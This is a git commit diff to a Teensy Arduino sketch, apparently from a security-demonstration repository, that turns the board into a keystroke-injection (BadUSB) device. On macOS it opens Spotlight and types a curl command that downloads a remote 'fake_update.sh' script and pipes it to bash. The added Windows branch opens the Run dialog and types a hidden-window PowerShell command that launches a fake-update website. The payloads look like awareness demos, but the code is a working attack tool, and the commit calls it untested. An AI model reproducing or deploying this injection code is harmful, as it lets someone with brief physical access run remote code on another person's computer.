6eac662f7c1b3bed5149ca0bfb8ce41d25c573ab
igraczech <suculent@me.com>
2019-07-31 23:43:22 +0200

    added untested example for windows

--- safe/teensy/2.0/2.0.ino
+++ safe/teensy/2.0/2.0.ino
@@ -18,8 +18,18 @@ void setup() {
   digitalWrite(ledPin, LOW);
 }
 
+// Choose your target:
+#define MACOSX
+//#define WINDOWS
+
+#ifdef MACOSX
 String SHELL_SCRIPT1 = "curl -s https://raw.githubusercontent.com/corpus-solutions/sec-takover-examples/master/safe/mac/fake_update.sh ";
 String SHELL_SCRIPT2 = " bash\n";
+#endif
+
+#ifdef WINDOWS
+String SHELL_SCRIPT1 = "powershell -windowstyle hidden (new-object -com wscript.shell).run('http://fakeupdate.net/win10u/',3)";
+#endif
 
 void loop() {
   
@@ -27,6 +37,26 @@ void loop() {
   
   blink();
    
+#ifdef MACOSX
+  doMac();
+#else if WINDOWS
+  doWindows();
+#endif
+
+  // stop forever (TODO: blink Teensy LED)
+  while (true) {
+    delay(5000);
+    blink();
+  }
+}
+
+void blink() {
+  digitalWrite(ledPin, HIGH);   // set the LED on
+  delay(1000);                  // wait for a second
+  digitalWrite(ledPin, LOW);    // set the LED off
+}
+
+void doMac() {
   pressAndReleaseAppleSpace(); 
   delay(1000); 
   
@@ -46,18 +76,6 @@ void loop() {
 
   // ..to bash. Enter.
   Keyboard.println(SHELL_SCRIPT2);
-
-  // stop forever (TODO: blink Teensy LED)
-  while (true) {
-    delay(5000);
-    blink();
-  }
-}
-
-void blink() {
-  digitalWrite(ledPin, HIGH);   // set the LED on
-  delay(1000);                  // wait for a second
-  digitalWrite(ledPin, LOW);    // set the LED off
 }
 
 void pressAndReleaseAppleSpace()
@@ -100,6 +118,28 @@ void pressAndReleasePipe()
 
   // Press Space
   Keyboard.set_key1(KEY_TILDE);
+  Keyboard.send_now();
+
+  // Release all the keys at the same instant
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+}
+
+void doWindows() {
+  pressAndReleaseWindowsR();
+  delay(1000);
+  Keyboard.print(SHELL_SCRIPT1);
+}
+
+void pressAndReleaseWindowsR()
+{
+  // Press Apple (Windows) Key
+  Keyboard.set_modifier(MODIFIERKEY_GUI);
+  Keyboard.send_now();
+
+  // Press Space
+  Keyboard.set_key1(KEY_R);
   Keyboard.send_now();
 
   // Release all the keys at the same instant
